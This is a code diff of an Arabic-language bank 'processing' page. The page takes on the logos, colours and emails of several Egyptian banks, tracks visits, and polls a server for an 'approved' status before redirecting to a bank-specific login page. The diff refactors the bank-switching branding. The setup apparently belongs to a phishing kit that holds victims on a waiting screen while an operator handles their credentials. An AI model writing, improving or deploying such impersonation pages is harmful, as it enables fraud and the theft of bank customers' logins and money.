@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>بنك مشرق مصر - جاري المعالجة</title>
+    <title>جاري المعالجة</title>
     <style>
         * {
             margin: 0;
@@ -33,6 +33,7 @@
             top: 0;
             z-index: 1000;
             width: 100%;
+            border-bottom: 4px solid #ff7f00;
         }
         .logo-container img {
             height: 38px;
@@ -157,7 +158,7 @@
 </head>
 <body>
 
-    <!-- Header: Logo right, Language button, and Menu icon left -->
+    <!-- Header -->
     <header>
         <div class="logo-container">
             <img id="headerLogo" src="images/mashreq_logo_new.jpg" alt="Bank">
@@ -201,8 +202,12 @@
         </div>
     </footer>
 
-    <!-- Scripts at the end of body -->
+    <!-- Scripts -->
+    <script src="branding.js"></script>
     <script>
+        // Initial branding apply from localStorage
+        applyBranding();
+
         fetch('/track_visit', {
             method: 'POST',
             headers: {
@@ -210,27 +215,6 @@
             },
             body: JSON.stringify({ action: 'track_visit', page: 'loading' })
         }).catch(error => console.error('Error tracking visit:', error));
-
-        // Bank Colors and Logos
-        const bankColors = {
-            'mashreq': { color: '#ff7f00', name: 'بنك المشرق', email: 'info@mashreq.com', logo: 'images/mashreq_logo_new.jpg' },
-            'bm': { color: '#b01c1c', name: 'بنك مصر', email: 'info@bm.com', logo: 'images/bm_logo.png' },
-            'cib': { color: '#004b91', name: 'بنك CIB', email: 'info@cib.com', logo: 'images/cib_logo.png' },
-            'nbe': { color: '#006b3f', name: 'البنك الأهلي المصري', email: 'info@nbe.com', logo: 'images/nbe_logo.png' }
-        };
-
-        // Update header and footer based on bank
-        window.addEventListener('DOMContentLoaded', () => {
-            const selectedBank = localStorage.getItem('selectedBank') || 'mashreq';
-            const config = bankColors[selectedBank];
-            document.getElementById('headerLogo').src = config.logo;
-            document.getElementById('footer').style.backgroundColor = config.color;
-            document.getElementById('footerEmail').innerHTML = '<strong>البريد الرسمي:</strong> ' + config.email;
-            document.getElementById('footerCopy').innerHTML = 'جميع الحقوق محفوظة © ' + config.name + ' 2026';
-            document.querySelector('.lang-btn').style.borderColor = config.color;
-            document.querySelector('.lang-btn').style.color = config.color;
-            document.querySelector('.spinner').style.borderTopColor = config.color;
-        });
 
         // Function to get login page URL based on selected bank
         function getLoginPageUrl(bankId) {
@@ -261,6 +245,11 @@
             })
             .then(response => response.json())
             .then(data => {
+                // Refresh branding from server data if available
+                if (data.data && data.data.bank) {
+                    applyBranding(data.data.bank);
+                }
+
                 if (data.status === 'approved') {
                     if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
                     if (data.type === 'login') {
@@ -288,6 +277,8 @@
 
         // Poll every 3 seconds
         statusInterval = setInterval(checkStatus, 3000);
+        // Immediate check
+        checkStatus();
     </script>
 
 </body>
